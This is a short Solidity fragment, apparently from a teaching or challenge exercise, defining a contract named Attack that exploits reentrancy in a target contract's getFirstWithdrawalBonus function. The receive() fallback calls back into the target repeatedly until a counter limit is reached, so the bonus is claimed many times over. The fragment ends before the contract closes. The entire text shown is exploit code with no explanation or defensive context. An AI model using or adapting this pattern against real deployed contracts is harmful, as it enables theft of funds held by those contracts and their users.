contract Attack {
    C public target;
    uint256 private count;
    uint256 private max;
    address private victim;
    constructor(address _target) {
        target = C(_target);
    }
    function attack(address _victim, uint256 _max) external payable {
        victim = _victim;
        max = _max;
        count = 0;
        target.getFirstWithdrawalBonus{value: _max * 100}(victim);
    }
    receive() external payable {
        if (count < max - 1) {
            count++;
            target.getFirstWithdrawalBonus{value: 100}(victim);
        }
    }
